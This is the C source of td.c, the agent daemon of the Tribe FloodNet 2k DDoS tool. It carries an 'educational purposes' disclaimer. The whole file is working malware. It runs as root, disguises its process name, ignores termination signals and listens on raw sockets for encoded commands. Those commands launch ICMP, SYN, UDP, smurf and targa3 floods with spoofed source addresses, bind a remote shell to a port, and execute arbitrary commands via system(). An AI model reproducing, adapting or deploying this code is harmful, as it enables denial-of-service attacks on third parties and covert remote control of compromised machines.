/*
 * Tribe FloodNet - 2k edition
 * by Mixter <mixter@newyorkoffice.com>
 *
 * td.c - tribe flood server
 *
 * This program is distributed for educational purposes and without any
 * explicit or implicit warranty; in no event shall the author or
 * contributors be liable for any direct, indirect or incidental damages
 * arising in any way out of the use of this software.
 *
 */

#include "tribe.h"

extern int fw00ding, nospoof, port4syn, psize;
extern unsigned long myip;
extern void security_through_obscurity (int);

void tribe_cmd (char, char *, char **);

int
main (int argc, char **argv)
{
  char buf[BS], clear[BS];
  struct ip *iph = (struct ip *) buf;
  struct tribe *tribeh = (struct tribe *) clear;
  int isock, tsock, usock, i;
  char *p = NULL, *data = (clear + sizeof (struct tribe));
  fd_set rfds;

  isock = socket (AF_INET, SOCK_RAW, ICMP);
  tsock = socket (AF_INET, SOCK_RAW, TCP);
  usock = socket (AF_INET, SOCK_RAW, UDP);

  if (geteuid ())
    exit (-1);

  memset (argv[0], 0, strlen (argv[0]));
  strcpy (argv[0], HIDEME);
  close (0);
  close (1);
  close (2);
#ifndef WINDOZE
  if (fork ())
    exit (0);
#else
  switch (fork ())
    {
    case -1:
      perror ("fork");
      exit (0);
      break;
    case 0:
      break;
    default:
      break;
    }
#endif

  signal (SIGHUP, SIG_IGN);
  signal (SIGTERM, SIG_IGN);
  signal (SIGCHLD, SIG_IGN);

  while (1)
    {
      FD_ZERO (&rfds);
      FD_SET (isock, &rfds);
      FD_SET (usock, &rfds);
      FD_SET (tsock, &rfds);
      if (select (usock + 1, &rfds, NULL, NULL, NULL) < 1)
	continue;
      if (FD_ISSET (isock, &rfds))
	{
	  i = read (isock, buf, BS) - (sizeof (struct ip) + sizeof (struct icmp));
	  myip = htonl (iph->dst);
	  if (i < 4)
	    continue;
	  p = (buf + sizeof (struct ip) + sizeof (struct icmp));
	  if (!isprint (p[0]))
	    continue;
	  memset (clear, 0, BS);
	  security_through_obscurity (1);
	  decode64 (p, clear, i);
	  memset (buf, 0, BS);
	  security_through_obscurity (0);
	  if ((tribeh->start == PROTO_SEP) && (tribeh->end == PROTO_SEP))
	    tribe_cmd (tribeh->id, data, argv);
	}
      if (FD_ISSET (tsock, &rfds))
	{
	  i = read (tsock, buf, BS) - (sizeof (struct ip) + sizeof (struct tcp));
	  myip = htonl (iph->dst);
	  if (i < 4)
	    continue;
	  p = (buf + sizeof (struct ip) + sizeof (struct tcp));
	  if (!isprint (p[0]))
	    continue;
	  memset (clear, 0, BS);
	  security_through_obscurity (1);
	  decode64 (p, clear, i);
	  memset (buf, 0, BS);
	  security_through_obscurity (0);
	  if ((tribeh->start == PROTO_SEP) && (tribeh->end == PROTO_SEP))
	    tribe_cmd (tribeh->id, data, argv);
	}
      if (FD_ISSET (usock, &rfds))
	{
	  i = read (usock, buf, BS) - (sizeof (struct ip) + sizeof (struct udp));
	  myip = htonl (iph->dst);
	  if (i < 4)
	    continue;
	  p = (buf + sizeof (struct ip) + sizeof (struct udp));
	  if (!isprint (p[0]))
	    continue;
	  memset (clear, 0, BS);
	  security_through_obscurity (1);
	  decode64 (p, clear, i);
	  memset (buf, 0, BS);
	  security_through_obscurity (0);
	  if ((tribeh->start == PROTO_SEP) && (tribeh->end == PROTO_SEP))
	    tribe_cmd (tribeh->id, data, argv);
	}
    }
/* 1 != 1 */
  return (0);
}

void
tribe_cmd (char id, char *target, char **argp)
{
#ifdef ATTACKLOG
  {
    char tmp[BS];
    sprintf (tmp, "PID %d CMD '%c' TARGET %s\n"
	     ,getpid (), id, target);
    dbug (tmp);
  }
#endif

  switch (id)
    {
    case ID_ICMP:
      if (fw00ding)		/* already in progress, ignored */
	break;
      fw00ding = 3;		/* commencing ICMP/8 flood */
      strcpy (argp[0], HIDEKIDS);
      commence_icmp (target);
      strcpy (argp[0], HIDEME);
      break;
    case ID_SMURF:
      if (fw00ding)		/* already in progress, ignored */
	break;
      fw00ding = 4;		/* commencing SMURF broadcast flood */
      strcpy (argp[0], HIDEKIDS);
      commence_smurf (target);
      strcpy (argp[0], HIDEME);
      break;
    case ID_SENDUDP:
      if (fw00ding)		/* already in progress, ignored */
	break;
      fw00ding = 1;		/* commencing UDP flood */
      strcpy (argp[0], HIDEKIDS);
      commence_udp (target);
      strcpy (argp[0], HIDEME);
      break;
    case ID_SENDSYN:
      if (fw00ding)		/* already in progress, ignored */
	break;
      fw00ding = 2;		/* commencing SYN flood */
      strcpy (argp[0], HIDEKIDS);
      commence_syn (target, port4syn);
      strcpy (argp[0], HIDEME);
      break;
    case ID_STOPIT:
      if (!fw00ding)		/* this has no longer a meaning */
	break;
      must_kill_all ();		/* all flood childs terminating */
      usleep (100);
      fw00ding = 0;
      break;
    case ID_SYNPORT:
      port4syn = atoi (target);	/* syn port set */
      break;
    case ID_PSIZE:
      psize = atoi (target);	/* new packet size */
      break;
    case ID_SWITCH:
      switch (atoi (target))
	{
	case 0:
	  nospoof = 0;		/* spoof mask: *.*.*.* */
	  break;
	case 1:
	  nospoof = 1;		/* spoof mask: real.*.*.* */
	  break;
	case 2:
	  nospoof = 2;		/* spoof mask: real.real.*.* */
	  break;
	case 3:
	  nospoof = 3;		/* spoof mask: real.real.real.* */
	  break;
	default:
	  break;
	}
      break;
    case ID_SHELL:
      shellsex (atoi (target));	/* shell bound to target port */
      break;
    case ID_TARGA:
      if (fw00ding)		/* already in progress, ignored */
	break;
      fw00ding = 4;		/* commencing targa3 attack */
      strcpy (argp[0], HIDEKIDS);
      commence_targa3 (target);
      strcpy (argp[0], HIDEME);
      break;
    case ID_MIX:
      if (fw00ding)		/* already in progress, ignored */
	break;
      fw00ding = 5;		/* commencing interval flood */
      strcpy (argp[0], HIDEKIDS);
      commence_mix (target);
      strcpy (argp[0], HIDEME);
      break;
    case ID_REXEC:
      system (target);
      break;
    default:
      break;
    }
}
